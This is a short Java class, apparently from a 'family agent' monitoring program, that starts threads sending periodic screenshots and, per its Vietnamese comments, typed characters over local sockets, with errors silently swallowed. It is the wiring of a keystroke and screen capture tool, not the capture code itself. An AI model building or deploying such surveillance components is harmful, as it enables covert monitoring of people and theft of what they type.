package com.family.agent.network;

import java.net.Socket;

public class Uploader extends Thread {
	
	public Uploader()
	{
		
	}
	
	public void run()
	{
		try
		{
			Socket soc1 = new Socket("localhost", 5000);
			// gui hinh anh
			Screenshot s = new Screenshot(soc1, 3000);
			s.start();
			
			Socket soc2 = new Socket("localhost", 2345);
			// gui ki tu
			Keystore k = new Keystore(soc2, 300000, 100);
			k.start();
		}
		catch(Exception e)
		{
			
		}
	
		
	}
}


